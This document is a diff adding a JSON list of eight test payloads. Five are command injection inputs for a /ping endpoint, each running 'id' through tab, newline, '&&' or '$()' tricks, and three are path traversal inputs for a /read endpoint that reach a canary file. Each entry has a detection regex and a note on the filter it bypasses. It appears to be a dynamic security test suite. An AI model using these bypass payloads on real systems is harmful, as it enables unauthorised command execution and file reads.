@@ -1,0 +1,82 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1%09id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Tab character (%09) as command separator instead of blocked chars"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1 -c 1 -W 1 && id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Space-separated flag injection to append id command"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\nid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Unicode newline (U+000A) literal in JSON to bypass regex on POST body"
+  },
+  {
+    "id": "dyn_cmd_4",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1%0Aid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Uppercase URL-encoded newline %0A (case variation) as command separator"
+  },
+  {
+    "id": "dyn_cmd_5",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1 -c 1 -W 1 -p $(id)"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Inject into ping -p flag with $() subshell — WAF pattern may only block standalone $() not within flag value"
+  },
+  {
+    "id": "dyn_path_1",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "....//....//....//tmp/path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "Double-dot obfuscation using ....// to bypass simple .. substring check"
+  },
+  {
+    "id": "dyn_path_2",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "%2e%2e%2f%2e%2e%2f%2e%2e%2ftmp/path_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "Full URL-encoding of ../ sequences to bypass .. substring check"
+  },
+  {
+    "id": "dyn_path_3",
+    "endpoint": "/read",
+    "method": "GET",
+    "params": {
+      "name": "..%2f..%2f..%2ftmp%2fpath_canary.txt"
+    },
+    "detect_pattern": "CANARY_PATH_5c9e0a",
+    "technique": "Partial URL-encoding of slash only in ../ to bypass literal .. block"
+  }
+]
